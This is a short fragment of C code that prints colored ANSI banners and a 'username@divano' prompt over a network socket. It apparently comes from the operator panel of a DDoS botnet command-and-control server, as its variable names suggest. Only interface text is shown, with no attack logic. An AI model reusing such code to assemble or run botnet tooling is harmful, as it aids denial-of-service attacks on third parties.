...
sprintf(instagram_10gbps2,   "\x1b[97m                         \x1b[97mBeyond the \x1b[95muniverse\x1b[97m and further\r\n");
...
sprintf(instagram_10gbps6,   "\x1b[97m\r\n");
  ...
  if(send(datafd, instagram_10gbps6, strlen(instagram_10gbps6), MSG_NOSIGNAL) == -1) goto end;
		...
		while(1) {
		char input [5000];
        sprintf(input, "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202mdivano\x1b[97m: \x1b[97m", accounts[find_line].username);
